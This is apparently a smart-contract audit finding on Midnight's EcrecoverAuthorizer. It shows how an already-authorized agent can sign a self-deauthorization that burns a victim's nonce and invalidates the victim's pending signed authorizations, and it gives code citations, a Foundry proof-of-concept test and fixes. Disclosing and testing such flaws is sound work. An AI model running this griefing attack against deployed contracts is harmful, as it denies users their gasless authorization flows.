### Title
Authorized Agent Can Grief Victim's Nonce via Self-Deauthorization - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` permits any address that `Midnight.isAuthorized(authorizer, signer)` returns `true` for to sign and submit an `Authorization` struct on behalf of the authorizer. An attacker who is already an authorized agent of the victim can craft `Authorization(authorizer=victim, authorized=attacker, isAuthorized=false, nonce=N)`, sign it with their own key, and submit it. The call passes all checks, increments `nonce[victim]`, and removes the attacker's own authorization — invalidating any pending off-chain signed authorization the victim holds at nonce N.

### Finding Description

The full execution path in `EcrecoverAuthorizer.setIsAuthorized`:

**Line 26** — nonce check and increment:
```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```
`nonce[victim]` is incremented from N to N+1 as part of the require evaluation, before any signature check. [1](#0-0) 

**Lines 31–36** — signer recovery and authorization check:
```solidity
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
require(signer != address(0), InvalidSignature());
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```
The attacker signs the digest with their own private key, so `signer = attacker`. The first branch `signer == authorization.authorizer` is `attacker == victim` → false. The second branch `isAuthorized(victim, attacker)` → **true** by precondition. The check passes. [2](#0-1) 

**Lines 46–47** — downstream call:
```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```
This calls `midnight.setIsAuthorized(attacker, false, victim)`, which sets `isAuthorized[victim][attacker] = false`. [3](#0-2) 

`Midnight.setIsAuthorized` itself only checks `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`. Since `msg.sender` is `EcrecoverAuthorizer` and `isAuthorized[victim][EcrecoverAuthorizer]` must be true for the authorizer flow to work, this passes. [4](#0-3) 

**Net state change after the attack:**
- `nonce[victim]` = N+1 (was N)
- `isAuthorized[victim][attacker]` = false (was true)
- Any off-chain signed `Authorization(authorizer=victim, ..., nonce=N)` is now permanently invalid (`InvalidNonce()` on submission)

No existing check prevents a delegated signer from signing a message that targets themselves as `authorized` with `isAuthorized=false`. The `Unauthorized()` guard is the only gate, and it explicitly allows authorized agents through. [5](#0-4) 

### Impact Explanation
Any pending signed authorization the victim has distributed off-chain (e.g., to a relayer or bundler) with nonce=N is rendered permanently invalid. The victim must re-sign with nonce=N+1 and redistribute. If the attacker repeats the pattern (requiring re-authorization each time), they can continuously invalidate the victim's next pending authorization, causing sustained DoS on any gasless authorization flow that relies on `EcrecoverAuthorizer`.

### Likelihood Explanation
**Preconditions:** Attacker must already hold `isAuthorized[victim][attacker] == true`. This is a normal operational state — users authorize agents, relayers, and smart contracts routinely. **Feasibility:** One transaction, no capital required, no oracle dependency. **Repeatability:** One-shot per authorization grant (attacker loses their own authorization), but the victim may re-authorize the attacker (e.g., a trusted relayer), enabling repeated attacks. The attacker can also be any of the many addresses a user might authorize (ratifiers, bundlers, callback contracts that were granted authorization).

### Recommendation
Restrict the signer in `EcrecoverAuthorizer` to only the authorizer themselves — remove the delegated-signer branch entirely:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegated signing is intentionally desired, add a guard preventing a delegated signer from submitting a message that deauthorizes themselves:

```solidity
if (signer != authorization.authorizer) {
    require(
        !(authorization.authorized == signer && !authorization.isAuthorized),
        Unauthorized()
    );
}
```

The simpler fix (require `signer == authorizer`) is preferable because the delegated-signer path is the sole root cause and its removal does not break the primary use case (the authorizer signs their own authorization off-chain and anyone submits it on-chain). [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract NonceGriefTest is BaseTest {
    function testSelfDeauthorizationGriefsVictimNonce() public {
        // Setup: victim authorizes ecrecoverAuthorizer (required for EcrecoverAuthorizer to call midnight)
        vm.prank(borrower); // borrower = victim
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);

        // Setup: victim authorizes attacker (lender) in Midnight
        vm.prank(borrower);
        midnight.setIsAuthorized(lender, true, borrower); // lender = attacker

        // Victim's current nonce is 0; victim has a pending off-chain authorization at nonce=0
        assertEq(ecrecoverAuthorizer.nonce(borrower), 0);
        assertTrue(midnight.isAuthorized(borrower, lender));

        // Attacker crafts self-deauthorization: authorizer=victim, authorized=attacker, isAuthorized=false, nonce=0
        Authorization memory auth = Authorization({
            authorizer: borrower,
            authorized: lender,
            isAuthorized: false,
            nonce: 0,
            deadline: block.timestamp + 1 days
        });

        // Attacker signs with their OWN key (not victim's)
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSeparator = keccak256(
            abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer))
        );
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[lender], digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Attacker submits — no revert
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assertions: nonce[victim] incremented, attacker deauthorized
        assertEq(ecrecoverAuthorizer.nonce(borrower), 1);           // nonce consumed
        assertFalse(midnight.isAuthorized(borrower, lender));       // attacker deauthorized

        // Victim's pending signed authorization at nonce=0 is now permanently invalid
        // Any attempt to submit it will revert with InvalidNonce()
    }
}
```

Expected assertions: `nonce[borrower] == 1`, `isAuthorized[borrower][lender] == false`, and any subsequent submission of the victim's nonce-0 authorization reverts with `InvalidNonce()`. [6](#0-5) [7](#0-6)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L41-52)
```text
    function signAuthorization(Authorization memory authorization, address _signer)
        internal
        view
        returns (Signature memory)
    {
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator =
            keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[_signer], digest);
        return Signature({v: v, r: r, s: s});
    }
```
